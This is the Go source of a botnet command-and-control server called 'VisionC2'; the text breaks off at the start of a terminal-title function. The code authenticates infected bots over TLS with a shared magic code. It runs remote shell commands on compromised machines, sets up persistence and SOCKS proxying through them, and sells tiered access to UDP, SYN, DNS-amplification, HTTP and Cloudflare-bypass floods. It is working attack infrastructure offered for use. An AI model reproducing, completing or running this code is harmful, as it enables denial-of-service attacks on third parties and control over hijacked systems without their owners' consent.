package main

import (
	"bufio"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	// File paths
	USERS_FILE = "users.json"

	// Server IPs
	USER_SERVER_IP = "0.0.0.0"
	BOT_SERVER_IP  = "0.0.0.0"

	//run setup.py dont try to change this yourself

	// Server ports
	BOT_SERVER_PORT  = "443" // do not change
	USER_SERVER_PORT = "420"

	// Authentication  these must match bot
	MAGIC_CODE       = "IhxWZGJDzdSviX$s"
	PROTOCOL_VERSION = "r5.6-stable"
)

type BotConnection struct {
	conn          net.Conn
	botID         string
	connectedAt   time.Time
	lastPing      time.Time
	authenticated bool
	arch          string
	ip            string
	ram           int64    // RAM in MB
	userConn      net.Conn // Track which user is controlling this bot
}

type client struct {
	conn           net.Conn
	user           User
	lastBotCommand time.Time
}

type attack struct {
	method   string
	ip       string
	port     string
	duration time.Duration
	start    time.Time
}

type Credential struct {
	Username string `json:"Username"`
	Password string `json:"Password"`
	Expire   string `json:"Expire"`
	Level    string `json:"Level"`
}

var (
	ongoingAttacks = make(map[net.Conn]attack)
	botConnections = make(map[string]*BotConnection)
	botConnsLock   sync.RWMutex
	botCount       int
	botConns       []net.Conn
	commandOrigin  = make(map[string]net.Conn) // botID -> user connection that sent command
	originLock     sync.RWMutex
)

type bot struct {
	arch string
	conn net.Conn
}

var (
	bots       = []bot{}
	clients    = []*client{}
	maxAttacks = 20
)

// ============================================================================
// AUTHENTICATION FUNCTIONS
// These functions handle the challenge-response authentication between
// the CNC server and bots. Uses MD5 hashing with the magic code to verify
// that connecting bots are legitimate.
// ============================================================================

// generateAuthResponse creates an MD5-based authentication response
// Takes a random challenge string and the shared secret (magic code)
// Concatenates challenge + secret + challenge, then MD5 hashes it
// Returns Base64 encoded hash that must match the bot's response
// This ensures bots know the magic code without transmitting it in plaintext
func generateAuthResponse(challenge, secret string) string {
	h := md5.New()
	h.Write([]byte(challenge + secret + challenge))
	response := base64.StdEncoding.EncodeToString(h.Sum(nil))
	return response
}

// randomChallenge generates a random alphanumeric string for authentication
// Creates a unique challenge for each bot connection attempt
// Uses standard alphanumeric charset (a-z, A-Z, 0-9) for compatibility
// Length parameter determines challenge complexity (typically 32 chars)
// Each bot gets a different challenge preventing replay attacks
func randomChallenge(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// ============================================================================
// BOT MANAGEMENT FUNCTIONS
// These functions manage the lifecycle of bot connections including
// registration, removal, cleanup, and tracking of bot metadata.
// Thread-safe operations using RWMutex for concurrent access.
// ============================================================================

// addBotConnection registers a newly authenticated bot in the connections map
// Handles duplicate bot IDs by closing the old connection (prevents stale entries)
// Stores bot metadata: connection socket, unique ID, architecture, RAM, timestamps
// Uses mutex locking for thread-safe map access (multiple bots connect concurrently)
// Maintains both new map-based storage and legacy slice for backwards compatibility
func addBotConnection(conn net.Conn, botID string, arch string, ram int64) {
	botConnsLock.Lock()
	defer botConnsLock.Unlock()

	// Check for duplicates - if same bot reconnects, close old socket
	if existing, exists := botConnections[botID]; exists {
		// Close old connection to prevent zombie sockets
		if existing.conn != nil {
			existing.conn.Close()
		}
		fmt.Printf("[☾℣☽] Replacing duplicate bot connection: %s (%s)\n", botID, conn.RemoteAddr())
	}

	botConn := &BotConnection{
		conn:          conn,
		botID:         botID,
		connectedAt:   time.Now(),
		lastPing:      time.Now(),
		authenticated: true,
		arch:          arch,
		ip:            conn.RemoteAddr().String(),
		ram:           ram,
		userConn:      nil, // No user controlling initially
	}

	botConnections[botID] = botConn
	botConns = append(botConns, conn)
	botCount++

	fmt.Printf("[☾℣☽] Bot authenticated: %s | Arch: %s | RAM: %dMB | IP: %s | Total: %d\n",
		botID, arch, ram, conn.RemoteAddr(), botCount)
}

// removeBotConnection cleanly removes a bot from all tracking structures
// Closes the network connection to free up system resources
// Removes from main connections map and decrements global bot count
// Also cleans up the command origin map (tracks which user sent commands)
// Removes from legacy botConns slice for backwards compatibility
// Thread-safe with mutex locking for both maps
func removeBotConnection(botID string) {
	botConnsLock.Lock()
	defer botConnsLock.Unlock()

	if botConn, exists := botConnections[botID]; exists {
		botConn.conn.Close()
		delete(botConnections, botID)
		botCount--

		// Remove from command origin map (tracks user->bot command routing)
		originLock.Lock()
		delete(commandOrigin, botID)
		originLock.Unlock()

		// Remove from legacy list for backwards compatibility
		for i, conn := range botConns {
			if conn == botConn.conn {
				botConns = append(botConns[:i], botConns[i+1:]...)
				break
			}
		}
	}
}

// cleanupDeadBots runs as a background goroutine to remove stale connections
// Checks every 60 seconds for bots that haven't sent a PONG in 5 minutes
// Dead bots can occur from network issues, bot crashes, or firewall blocks
// Prevents resource leaks from accumulating zombie connections over time
// Logs cleanup activity for monitoring and debugging purposes
func cleanupDeadBots() {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		botConnsLock.Lock()
		now := time.Now()
		deadBots := []string{}

		// Scan all bots and check last ping timestamp
		for botID, botConn := range botConnections {
			// 5 minute timeout - generous to handle network latency
			if now.Sub(botConn.lastPing) > 5*time.Minute {
				deadBots = append(deadBots, botID)
				fmt.Printf("[CLEANUP] Removing dead bot: %s (Last ping: %v ago)\n",
					botID, now.Sub(botConn.lastPing))
			}
		}

		for _, botID := range deadBots {
			if botConn, exists := botConnections[botID]; exists {
				botConn.conn.Close()
				delete(botConnections, botID)
				botCount--

				// Clean up from origin map
				originLock.Lock()
				delete(commandOrigin, botID)
				originLock.Unlock()
			}
		}
		botConnsLock.Unlock()

		if len(deadBots) > 0 {
			fmt.Printf("[CLEANUP] Removed %d dead bots | Total alive: %d\n", len(deadBots), botCount)
		}
	}
}

// ============================================================================
// BOT CONNECTION HANDLER
// Main function that handles the entire lifecycle of a bot connection:
// 1. Challenge-response authentication to verify bot legitimacy
// 2. Protocol version verification for compatibility
// 3. Bot registration with metadata (ID, arch, RAM)
// 4. Continuous command loop for receiving bot responses and pings
// 5. Cleanup on disconnect to free resources
// ============================================================================

// handleBotConnection manages authentication and command routing for a single bot
// Runs as a goroutine for each incoming bot connection
// Implements the full authentication handshake protocol
// Routes shell command output back to the user who issued the command
// Handles Base64-encoded output for binary-safe transmission
func handleBotConnection(conn net.Conn) {
	defer func() {
		// Cleanup: Find and remove bot from connections map on disconnect
		botConnsLock.Lock()
		for botID, botConn := range botConnections {
			if botConn.conn == conn {
				delete(botConnections, botID)
				botCount--
				fmt.Printf("[☾℣☽] Bot disconnected: %s (%s)\n", botID, conn.RemoteAddr())
				break
			}
		}

		// Remove from legacy list
		for i, botConn := range botConns {
			if botConn == conn {
				botConns = append(botConns[:i], botConns[i+1:]...)
				break
			}
		}
		botConnsLock.Unlock()

		conn.Close()
	}()

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	// Step 1: Send authentication challenge
	challenge := randomChallenge(32)
	if _, err := writer.WriteString(fmt.Sprintf("AUTH_CHALLENGE:%s\n", challenge)); err != nil {
		return
	}
	writer.Flush()

	fmt.Printf("[AUTH] Sent challenge to %s\n", conn.RemoteAddr())

	// Step 2: Read bot's response
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	authResponse, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("[AUTH] Failed to read auth response from %s: %v\n", conn.RemoteAddr(), err)
		return
	}

	authResponse = strings.TrimSpace(authResponse)

	// Step 3: Verify response
	expectedResponse := generateAuthResponse(challenge, MAGIC_CODE)
	if authResponse != expectedResponse {
		fmt.Printf("[AUTH] Invalid auth from %s. Got: %s... Expected: %s...\n",
			conn.RemoteAddr(),
			safeSubstring(authResponse, 0, 10),
			safeSubstring(expectedResponse, 0, 10))
		writer.WriteString("AUTH_FAILED\n")
		writer.Flush()
		return
	}

	// Step 4: Send success
	writer.WriteString("AUTH_SUCCESS\n")
	writer.Flush()

	fmt.Printf("[AUTH] Authentication successful for %s\n", conn.RemoteAddr())

	// Step 5: Wait for bot registration
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	registerMsg, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("[AUTH] Failed to read registration from %s: %v\n", conn.RemoteAddr(), err)
		return
	}

	registerMsg = strings.TrimSpace(registerMsg)

	// Parse registration message (expected format: "REGISTER:v1.0:botID:arch")
	if !strings.HasPrefix(registerMsg, "REGISTER:") {
		fmt.Printf("[AUTH] Invalid registration format from %s: %s\n", conn.RemoteAddr(), registerMsg)
		return
	}

	parts := strings.Split(registerMsg, ":")
	if len(parts) < 3 {
		fmt.Printf("[AUTH] Malformed registration from %s: %s\n", conn.RemoteAddr(), registerMsg)
		return
	}

	version := parts[1]
	botID := parts[2]
	arch := "unknown"
	if len(parts) > 3 {
		arch = parts[3]
	}
	// Parse RAM (in MB) - expected format: REGISTER:version:botID:arch:ram
	var ram int64 = 0
	if len(parts) > 4 {
		fmt.Sscanf(parts[4], "%d", &ram)
	}

	// Your existing version check
	if version != PROTOCOL_VERSION {
		fmt.Printf("[AUTH] Version mismatch from %s: got %s, expected %s\n",
			conn.RemoteAddr(), version, PROTOCOL_VERSION)
		return
	}

	// Add bot to connections
	addBotConnection(conn, botID, arch, ram)

	// Reset deadline for normal operation
	conn.SetDeadline(time.Time{})

	// Start ping handler
	stopPing := make(chan struct{})
	defer close(stopPing)
	go pingHandler(conn, botID, stopPing)

	// Main bot command loop
	for {
		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
		line, err := reader.ReadString('\n')
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// Timeout - send ping
				writer.WriteString("PING\n")
				writer.Flush()
				continue
			}
			break
		}

		line = strings.TrimSpace(line)

		// Update last ping time
		if line == "PONG" {
			botConnsLock.Lock()
			if botConn, exists := botConnections[botID]; exists {
				botConn.lastPing = time.Now()
			}
			botConnsLock.Unlock()
			continue
		}

		// Handle Base64 encoded output from shell commands
		if strings.HasPrefix(line, "OUTPUT_B64:") {
			// Extract the Base64 string
			b64Str := strings.TrimPrefix(line, "OUTPUT_B64:")
			b64Str = strings.TrimSpace(b64Str)

			// Decode Base64
			decoded, err := base64.StdEncoding.DecodeString(b64Str)
			if err != nil {
				fmt.Printf("[BOT-%s] Failed to decode Base64 output: %v\n", botID, err)
				fmt.Printf("[BOT-%s] Raw Base64: %s...\n", botID, safeSubstring(b64Str, 0, 50))
			} else {
				// Format the decoded output nicely
				output := string(decoded)
				fmt.Printf("[BOT-%s] Shell Output (%d bytes):\n", botID, len(decoded))
				fmt.Printf("══════════════════════════════════════════════════════════\n")
				fmt.Printf("%s\n", output)
				fmt.Printf("══════════════════════════════════════════════════════════\n")

				// Check if we should forward this to a user
				originLock.RLock()
				userConn, hasUser := commandOrigin[botID]
				originLock.RUnlock()

				if hasUser && userConn != nil {
					// Send formatted output to user
					forwardBotResponseToUser(botID, output, userConn)

					// Clear the origin after sending response
					originLock.Lock()
					delete(commandOrigin, botID)
					originLock.Unlock()
				}
			}
			continue
		}

		// Handle other bot messages
		fmt.Printf("[BOT-%s] %s\n", botID, line)

		// Check if we should forward this to a user
		originLock.RLock()
		userConn, hasUser := commandOrigin[botID]
		originLock.RUnlock()

		if hasUser && userConn != nil {
			// Send message to user
			userConn.Write([]byte(fmt.Sprintf("[Bot: %s] %s\r\n", botID, line)))

			// Clear the origin after sending response
			originLock.Lock()
			delete(commandOrigin, botID)
			originLock.Unlock()
		}
	}
}

// forwardBotResponseToUser sends shell command output to the user who requested it
// Formats the output with ANSI colors for visual clarity in terminal
// Includes the bot ID so users know which bot generated the response
// Wraps output in decorative borders for easy reading
// Handles edge case of output not ending with newline
func forwardBotResponseToUser(botID, response string, userConn net.Conn) {
	if response == "" {
		return
	}

	// Send formatted output with colored header and borders
	userConn.Write([]byte(fmt.Sprintf("\033[1;36m[Bot: %s] Shell Output:\r\n", botID)))
	userConn.Write([]byte("\033[1;33m══════════════════════════════════════════════════════════\r\n"))
	userConn.Write([]byte("\033[0m")) // Reset color for actual output
	userConn.Write([]byte(response))
	if !strings.HasSuffix(response, "\n") {
		userConn.Write([]byte("\r\n"))
	}
	userConn.Write([]byte("\033[1;33m══════════════════════════════════════════════════════════\r\n"))
	userConn.Write([]byte("\033[0m")) // Reset color after output
}

// pingHandler sends periodic PING messages to keep bot connections alive
// Runs as a goroutine for each authenticated bot
// Sends PING every 30 seconds to verify bot is still responsive
// Bot responds with PONG which updates lastPing timestamp
// Stops gracefully when stop channel is closed (bot disconnects)
// Connection errors cause handler to exit (triggers cleanup)
func pingHandler(conn net.Conn, botID string, stop chan struct{}) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// Send PING, exit on error (connection dead)
			if _, err := conn.Write([]byte("PING\n")); err != nil {
				return
			}
		case <-stop:
			// Graceful shutdown requested
			return
		}
	}
}

// safeSubstring extracts a substring without risking index out of bounds panic
// Go panics on bad slice indices, this prevents crashes on malformed input
// Used for logging partial strings (e.g., first 10 chars of auth response)
// Returns empty string if start is beyond string length
// Truncates at string end if requested length exceeds remaining chars
func safeSubstring(s string, start, length int) string {
	if start >= len(s) {
		return ""
	}
	end := start + length
	if end > len(s) {
		end = len(s)
	}
	return s[start:end]
}

// ============================================================================
// TLS CONFIGURATION
// Configures secure TLS 1.2+ encryption for bot-to-CNC communication.
// Requires server.crt and server.key files generated during setup.
// Uses modern cipher suites with forward secrecy (ECDHE) for security.
// ============================================================================

// loadTLSConfig loads X.509 certificates and configures secure TLS settings
// Requires server.crt (certificate) and server.key (private key) in current dir
// Enforces TLS 1.2 minimum to reject outdated/vulnerable protocols
// Prefers X25519 and P256 curves for key exchange (modern and fast)
// Server cipher preference prevents clients from choosing weak ciphers
// Fatal error if certs missing - CNC cannot operate without encryption
func loadTLSConfig() *tls.Config {
	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		fmt.Printf("[FATAL] Failed to load TLS certificates: %v\n", err)
		fmt.Println("[FATAL] Make sure server.crt and server.key exist in the current directory")
		os.Exit(1)
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
		CurvePreferences: []tls.CurveID{
			tls.X25519,    // Modern, fast elliptic curve
			tls.CurveP256, // Fallback NIST curve
		},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			// AES-GCM ciphers with SHA-384/256 for authenticated encryption
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			// ChaCha20-Poly1305 for devices without AES hardware acceleration
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			// AES-128 variants for lower resource environments
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	}
}

// ============================================================================
// PERMISSION CHECKING FUNCTIONS
// Role-based access control for CNC commands. Each function checks if the
// authenticated user has sufficient privileges for specific command categories.
// Permission levels from lowest to highest: Basic < Pro < Admin < Owner
// ============================================================================

// canUseDDoS checks if user can execute attack commands (UDP, TCP, HTTP floods)
// Minimum required level: Basic (all authenticated users can use DDoS)
// This is the most permissive check - anyone with valid login can attack
func (c *client) canUseDDoS() bool {
	// Basic users can only use DDoS commands
	level := c.user.GetLevel()
	return level == Basic || level == Pro || level == Admin || level == Owner
}

// canUseShell checks if user can execute shell commands on bots (!shell, !exec)
// Minimum required level: Admin (elevated privilege required for code execution)
// Shell access is dangerous - can run arbitrary commands on all bots
// Also gates SOCKS proxy commands which tunnel traffic through bots
func (c *client) canUseShell() bool {
	// Shell commands require Admin or higher due to security risk
	level := c.user.GetLevel()
	return level == Admin || level == Owner
}

// canUseBotManagement checks if user can manage bot lifecycle (reinstall, kill, persist)
// Minimum required level: Admin
// These commands affect bot availability for all users:
// - !reinstall: Forces bot to re-download and reinstall itself
// - !lolnogtfo: Kills and removes bot (destructive action)
// - !persist: Sets up boot persistence on infected systems
func (c *client) canUseBotManagement() bool {
	// Bot management requires Admin or Owner level privileges
	level := c.user.GetLevel()
	return level == Admin || level == Owner
}

// canUsePrivate checks if user can access owner-only features
// Minimum required level: Owner (highest privilege level)
// Private commands include:
// - Database access (view all user credentials)
// - System configuration commands
// - Any future sensitive operations
func (c *client) canUsePrivate() bool {
	// Private commands require Owner only - no delegation
	level := c.user.GetLevel()
	return level == Owner
}

// canTargetSpecificBot checks if user can send commands to individual bots
// Minimum required level: Pro
// By default, commands go to ALL bots. This permission allows:
// - Targeting specific bot by ID: !abc123 <command>
// - Useful for testing or controlling specific infected systems
// - Prevents Basic users from accidentally targeting wrong bot
func (c *client) canTargetSpecificBot() bool {
	// Targeting specific bots requires Pro or higher level
	level := c.user.GetLevel()
	return level == Pro || level == Admin || level == Owner
}

// ============================================================================
// HELP MENU SYSTEM
// Dynamically generates help menus based on user's permission level.
// Only shows commands the user is authorized to execute.
// Uses ANSI escape codes for colored terminal output.
// ============================================================================

// showHelpMenu displays available commands based on user's permission level
// Dynamically builds menu sections - only shows what user can actually use
// Prevents confusion by hiding unavailable commands from lower-tier users
// Each section is conditionally rendered based on permission check
func (c *client) showHelpMenu(conn net.Conn) {
	c.writeHeader(conn) // Top border with user level

	// All authenticated users see general commands
	if c.canUseDDoS() {
		c.writeGeneralCommands(conn)
	}

	// Admin+ sees shell commands
	if c.canUseShell() {
		c.writeShellCommands(conn)
	}

	// Pro+ sees bot targeting
	if c.canTargetSpecificBot() {
		c.writeBotTargeting(conn)
	}

	// Admin+ sees bot management
	if c.canUseBotManagement() {
		c.writeBotManagement(conn)
	}

	// Owner only sees private commands
	if c.canUsePrivate() {
		c.writePrivateCommands(conn)
	}

	c.writeFooter(conn) // Bottom border
}

// showAttackMenu displays all available attack methods
// Separate from main help to save screen space
func (c *client) showAttackMenu(conn net.Conn) {
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\033[1;97m╔══════════════════════════════════════════════════════════════╗\r\n"))
	conn.Write([]byte("\033[1;97m║              \033[1;31m☠ VisionC2 Attack Methods ☠\033[1;97m                   ║\r\n"))
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;33mLayer 4 (Network)\033[1;97m                                         ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !udpflood  <ip> <port> <time>  - UDP flood                ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !tcpflood  <ip> <port> <time>  - TCP flood                ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !syn       <ip> <port> <time>  - SYN flood                ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !ack       <ip> <port> <time>  - ACK flood                ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !gre       <ip> <port> <time>  - GRE flood                ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !dns       <ip> <port> <time>  - DNS amplification        ║\r\n"))
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;35mLayer 7 (Application)\033[1;97m                                      ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !http      <url> <port> <time> - HTTP GET/POST flood      ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !https     <url> <port> <time> - HTTPS/TLS flood          ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !tls       <url> <port> <time> - TLS flood (alias)        ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !cfbypass  <url> <port> <time> - Cloudflare bypass        ║\r\n"))
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;36mControl\033[1;97m                                                    ║\r\n"))
	conn.Write([]byte("\033[1;97m║    !stop                          - Stop all attacks         ║\r\n"))
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;32mProxy Mode (L7 only)\033[1;97m - Add at end: -p <proxy_url.txt>     ║\r\n"))
	conn.Write([]byte("\033[1;97m║    Example: !http site.com 443 60 -p http://x.com/proxy.txt  ║\r\n"))
	conn.Write([]byte("\033[1;97m╚══════════════════════════════════════════════════════════════╝\r\n"))
	conn.Write([]byte("\033[0m\r\n"))
}

func (c *client) writeHeader(conn net.Conn) {
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\033[1;97m╔══════════════════════════════════════════════════════════════╗\r\n"))
	conn.Write([]byte(fmt.Sprintf("\033[1;97m║              \033[1;31mVisionC2 Help Menu [%s]\033[1;97m                    ║\r\n", c.getLevelString())))
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
}

// writeGeneralCommands outputs the basic utility commands available to all users
// Includes: bots list, clear screen, banner, help, ongoing attacks, logout
// These are non-destructive informational commands
func (c *client) writeGeneralCommands(conn net.Conn) {
	commands := []string{
		"║  \033[1;32mGeneral Commands\033[1;97m                                           ║",
		"║    bots           - List all connected bots                  ║",
		"║    clear/cls      - Clear screen                             ║",
		"║    ongoing        - Show ongoing attacks                     ║",
		"║    logout/exit    - Disconnect from C2                       ║",
		"║  \033[1;31mAttack Commands\033[1;97m                                            ║",
		"║    attack/methods - Show all attack methods                  ║",
	}
	c.writeSection(conn, commands)
}

// writeShellCommands outputs remote code execution commands (Admin+ only)
// !shell: Executes command and waits for output (blocking)
// !detach: Executes command in background (non-blocking, no output)
// !stream: Real-time output streaming for long-running commands
func (c *client) writeShellCommands(conn net.Conn) {
	commands := []string{
		"║  \033[1;36mShell Commands\033[1;97m (sent to ALL bots)       ║",
		"║    !shell <command>   - Remote Scripting                     ║",
		"║    !detach <command>  - Run command in background            ║",
		"║    !stream <command>  - Real-time output streaming           ║",
	}
	c.writeSection(conn, commands)
}

// writeBotTargeting outputs syntax for targeting individual bots (Pro+ only)
// Allows sending commands to specific bot by ID prefix or full ID
// Format: !<botid> <command> - routes command to just that bot
// Useful for testing commands or controlling specific compromised systems
func (c *client) writeBotTargeting(conn net.Conn) {
	commands := []string{
		"║  \033[1;33mBot Targeting\033[1;97m                           ║",
		"║    !<botid> <cmd>     - Send command to specific bot         ║",
		"║    Example: !abc123 !shell whoami                            ║",
	}
	c.writeSection(conn, commands)
}

// writeBotManagement outputs bot lifecycle commands (Admin+ only)
// !reinstall: Forces bots to re-download and reinstall (update mechanism)
// !lolnogtfo: Kills bot process - removes from infected system (cleanup)
// !persist: Sets up boot persistence via cron/systemd/init scripts
// !info: Requests system info from all bots
func (c *client) writeBotManagement(conn net.Conn) {
	commands := []string{
		"║  \033[1;34mBot Management\033[1;97m (sent to ALL bots)       ║",
		"║    !reinstall         - Force reinstall bot                  ║",
		"║    !lolnogtfo         - Kill/remove bot                      ║",
		"║    !persist           - Setup persistence                    ║",
		"║    !info              - Get bot info                         ║",
	}
	c.writeSection(conn, commands)
}

// writePrivateCommands outputs owner-only sensitive commands
// private: Shows this section (meta-command)
// db: Displays all user credentials from users.json
// !socks: Establishes SOCKS5 proxy through bots for traffic tunneling
// !stopsocks: Terminates active proxy connections
func (c *client) writePrivateCommands(conn net.Conn) {
	commands := []string{
		"║  \033[1;35mPrivate Commands\033[1;97m (Owner only)                             ║",
		"║    private            - Show private commands                ║",
		"║    db                 - Show user database                   ║",
		"║    !socks <port>      - Establish SOCKS5 reverse proxy       ║",
		"║    !stopsocks         - Terminate proxy connections          ║",
	}
	c.writeSection(conn, commands)
}

func (c *client) writeSection(conn net.Conn, commands []string) {
	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
	for _, cmd := range commands {
		conn.Write([]byte(fmt.Sprintf("\033[1;97m%s\r\n", cmd)))
	}
}

func (c *client) writeFooter(conn net.Conn) {
	conn.Write([]byte("\033[1;97m╚══════════════════════════════════════════════════════════════╝\r\n"))
	conn.Write([]byte("\033[0m\r\n"))
}

// getLevelString converts the numeric permission level to human-readable string
// Used in UI displays (banner, prompt, help menu) to show user's access tier
// Returns: "Owner", "Admin", "Pro", "Basic", or "Unknown"
// Maps internal Level enum values to user-friendly names
func (c *client) getLevelString() string {
	level := c.user.GetLevel()
	switch level {
	case Owner:
		return "Owner"
	case Admin:
		return "Admin"
	case Pro:
		return "Pro"
	case Basic:
		return "Basic"
	default:
		return "Unknown"
	}
}

// ============================================================================
// MAIN ENTRY POINT
// Initializes the CNC server with two listeners:
// 1. TLS bot listener on port 443 - accepts encrypted bot connections
// 2. Plain TCP user listener on configured port - accepts admin CLI logins
// Creates default root user if users.json doesn't exist.
// ============================================================================

// main is the CNC server entry point - starts both bot and user servers
// Creates root user with random password on first run
// Loads TLS certificates for secure bot communication
// Starts background goroutines for dead bot cleanup
// Bot server runs TLS on 443, user CLI runs plain TCP
func main() {
	// First run: Create default root user with random 12-char password
	if _, fileError := os.ReadFile("users.json"); fileError != nil {
		password, err := randomString(12)
		if err != nil {
			fmt.Println("Error generating password:", err)
			return
		}

		rootUser := User{
			Username: "root",
			Password: password,
			Expire:   time.Now().AddDate(111, 111, 111),
			Level:    "Owner",
		}

		bytes, err := json.Marshal([]User{rootUser})
		if err != nil {
			fmt.Println("Error marshalling user data:", err)
			return
		}

		if err := os.WriteFile("users.json", bytes, 0777); err != nil {
			fmt.Println("Error writing to users.json:", err)
			return
		}
		fmt.Println("[☾℣☽] Login with username", rootUser.Username, "and password", rootUser.Password)
	}

	// Load TLS configuration
	fmt.Println("[INFO] Loading TLS certificates...")
	tlsConfig := loadTLSConfig()
	fmt.Println("[INFO] TLS configuration loaded successfully")

	// Start dead bot cleanup routine
	go cleanupDeadBots()

	// Start bot server (TLS ONLY)
	go func() {
		fmt.Println("[☾℣☽] Bot TLS server starting on", BOT_SERVER_IP+":"+BOT_SERVER_PORT)
		botListener, err := tls.Listen("tcp", BOT_SERVER_IP+":"+BOT_SERVER_PORT, tlsConfig)
		if err != nil {
			fmt.Println("[FATAL] Error starting bot TLS server:", err)
			os.Exit(1)
		}
		defer botListener.Close()

		fmt.Println("[☾℣☽] Bot TLS server is running on port 443")
		fmt.Println("[AUTH] Using magic code authentication:", MAGIC_CODE)

		for {
			conn, err := botListener.Accept()
			if err != nil {
				fmt.Println("Error accepting bot TLS connection:", err)
				continue
			}

			// Validate TLS and start authentication
			go validateTLSHandshake(conn)
		}
	}()

	// Start admin CLI server (plain TCP)
	fmt.Println("[☾℣☽] Admin CLI server starting on", USER_SERVER_IP+":"+USER_SERVER_PORT)
	userListener, err := net.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT)
	if err != nil {
		fmt.Println("Error starting user server:", err)
		return
	}
	defer userListener.Close()

	go updateTitle()

	// User connection handling
	for {
		conn, err := userListener.Accept()
		if err != nil {
			fmt.Println("Error accepting user connection:", err)
			continue
		}
		fmt.Println("[☾℣☽] [User] Connected To Login Port:", conn.RemoteAddr())

		go handleRequest(conn)
	}
}

// validateTLSHandshake performs TLS security validation on incoming connections
// Ensures the connection uses TLS 1.2+ (rejects old vulnerable protocols)
// Validates cipher suite is modern with forward secrecy (ECDHE + AES-GCM/ChaCha20)
// TLS 1.3 connections auto-accepted (all TLS 1.3 ciphers are secure)
// Rejects connections that don't meet security standards
// On success, hands off to handleBotConnection for authentication
func validateTLSHandshake(conn net.Conn) {
	defer func() {
		// Panic recovery to prevent single bad connection from crashing server
		if r := recover(); r != nil {
			fmt.Printf("[PANIC] in validateTLSHandshake: %v\n", r)
			conn.Close()
		}
	}()

	// Type assert to TLS connection
	tlsConn, ok := conn.(*tls.Conn)
	if !ok {
		return
	}

	// 10 second deadline for handshake to prevent slow-loris attacks
	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))

	if err := tlsConn.Handshake(); err != nil {
		return
	}

	// Enforce minimum TLS 1.2 - older versions have known vulnerabilities
	state := tlsConn.ConnectionState()
	if state.Version < tls.VersionTLS12 {
		tlsConn.Close()
		return
	}

	// Whitelist of acceptable cipher suites with forward secrecy
	validCiphers := map[uint16]bool{
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:   true,
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256: true,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:         true,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:       true,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:         true,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:       true,
		0x1301: true, // TLS_AES_128_GCM_SHA256 (TLS 1.3)
		0x1302: true, // TLS_AES_256_GCM_SHA384 (TLS 1.3)
		0x1303: true, // TLS_CHACHA20_POLY1305_SHA256 (TLS 1.3)
	}

	if state.Version == tls.VersionTLS13 {
		fmt.Printf("[ACCEPT] TLS 1.3 connection from %s\n", conn.RemoteAddr())
	} else if !validCiphers[state.CipherSuite] {
		tlsConn.Close()
		return
	}

	// Reset deadline for authentication phase
	tlsConn.SetDeadline(time.Time{})

	// Start authentication process (runs in goroutine)
	go handleBotConnection(conn)
}

// ============================================================================
// UI UPDATE FUNCTIONS
// Handle dynamic terminal title updates and statistics display.
// These run as background goroutines to keep user's terminal updated.
// ============================================================================

// updateTitle continuously updates the terminal title for connected users
// Shows live statistics: bot count, ongoing attacks, user info
// Uses spinning characters (∴/∵) for visual activity indicator
// Updates every 1-2 seconds for real-time feedback
// Each client gets their own update goroutine
func updateTitle() {
